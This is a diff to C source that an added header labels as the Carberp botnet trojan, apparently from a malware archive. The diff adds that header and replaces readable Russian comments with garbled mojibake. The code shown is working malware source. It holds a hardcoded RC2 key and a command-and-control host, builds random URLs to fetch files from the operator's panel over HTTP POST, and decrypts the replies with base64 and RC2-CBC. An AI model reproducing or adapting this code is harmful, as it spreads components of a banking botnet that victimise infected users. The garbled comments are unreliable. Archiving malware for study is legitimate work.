@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 #include <stdio.h>
@@ -24,7 +35,7 @@ const char* UserAgent = 0; //"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
 const char* RC2_Password = "bRS8yYQ0APq9xfzC";
 const char* HostAdminka = "rus.gipa.in";
 
-//расширения для генерации урлов
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 const char* SETFolderExts[] = { ".phtml", ".php3", ".phtm", ".inc", ".7z" };
 
 int GenerateKey( const char* password, const char* IV, HCRYPTPROV* provider, HCRYPTKEY* key);
@@ -36,7 +47,7 @@ char* LoadFileFromAdminka( const char* nameFile, int* size )
  int szData = 0;
  char urlList[96];
 
- int symbols = u_rand_range( 57, 64 ); //символов в урле
+ int symbols = u_rand_range( 57, 64 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
  for( int i = 0; i < symbols; i++ )
    urlList[i] = u_rand_range( 'a', 'z' );
  urlList[symbols] = 0;
@@ -45,7 +56,7 @@ char* LoadFileFromAdminka( const char* nameFile, int* size )
  if( data ) {
    int szList = 0;
    char* list = DecodeData( data, szData, &szList );
-   //ищем нужный файл
+   //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
    const char* p = u_istrstr( list, nameFile );
    if( p ) {
      int len = _lstrlen(nameFile);
@@ -103,10 +114,10 @@ char* LoadFileFromInet( const char* host, const char* url, int* size, const char
  if( inet ) {
     HINTERNET connect = _InternetConnectA( inet, host, INTERNET_DEFAULT_HTTP_PORT, NULL,NULL, INTERNET_SERVICE_HTTP, 0, 1u );
     if( connect ) { 
-      // Пост запрос
+      // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
       HINTERNET request = _HttpOpenRequestA( connect, postData ? "POST" : 0, url, NULL, NULL, 0, 0, 1 ); 
       if( request ) {
-        // Добавляем необходимые параметры запроса
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         if( postData ) {
           _HttpAddRequestHeadersA( request, "Accept: */*", -1, HTTP_ADDREQ_FLAG_ADD );
           _HttpAddRequestHeadersA( request, "Content-Type: application/x-www-form-urlencoded", -1, HTTP_ADDREQ_FLAG_ADD );
@@ -129,14 +140,14 @@ char* DecodeData( char* data, int szData, int* retData )
 {
  char IV[8];
  *retData = 0;
- //извлекаем вектор из 8 символов, части которого находятся в начале data (4-е символа) и в конце (4-е символа)
- *((DWORD*)IV) = *((DWORD*)data); //копируем 1-е четыре символа
+ //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 8 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ data (4-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ (4-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
+ *((DWORD*)IV) = *((DWORD*)data); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
  char *p, *p2; p = p2 = data + szData - 1;
  while( *p == '=' ) p--;
- int ca = p2 - p; //количество знаков = в конце
+ int ca = p2 - p; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ = пїЅ пїЅпїЅпїЅпїЅпїЅ
  p -= 3;
- *((DWORD*)(IV + 4)) = *((DWORD*)p); //копируем последние четыре символа (перед знаками '=')
- while( ca-- ) *p++ = *p2--; //переносим знаки =
+ *((DWORD*)(IV + 4)) = *((DWORD*)p); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ '=')
+ while( ca-- ) *p++ = *p2--; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ =
  szData -= 8;
  u_memcpy( data, data + 4, szData );
 
@@ -144,7 +155,7 @@ char* DecodeData( char* data, int szData, int* retData )
  DWORD szData2 = szData;
  _CryptStringToBinaryA( data, szData, CRYPT_STRING_BASE64, (BYTE*)data2, &szData2, 0, 0 );
 
- //декодирование по RC2
+ //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ RC2
  HCRYPTPROV provider;
  HCRYPTKEY key;
  if( GenerateKey( RC2_Password, IV, &provider, &key ) ) {
@@ -171,17 +182,17 @@ typedef struct
 	BYTE KeyData[64];
 } TKeyBlob;
 
-// Генерировать ключ криптования на основе пароля и вектора инициализации IV
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IV
 int GenerateKey( const char* password, const char* IV, HCRYPTPROV* provider, HCRYPTKEY* key)
 {
  *provider = 0;
  *key = 0;
 
-// Поключаемся к провайдеру
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
  if( _CryptAcquireContextA( provider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
  {
    TKeyBlob keyBlob;
-   // импортируем ключ
+   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
    u_memset( &keyBlob, 0, sizeof(keyBlob) );
    keyBlob.KeyHeader.bType    = PLAINTEXTKEYBLOB;
    keyBlob.KeyHeader.bVersion = CUR_BLOB_VERSION;
@@ -192,7 +203,7 @@ int GenerateKey( const char* password, const char* IV, HCRYPTPROV* provider, HCR
 
    if( _CryptImportKey( *provider, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, key ) )
    {
-     // Настраиваем ключ
+     // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
      if( _CryptSetKeyParam( *key, KP_IV, (BYTE*)IV, 0 ) )
      {
        DWORD CryptMode = CRYPT_MODE_CBC;
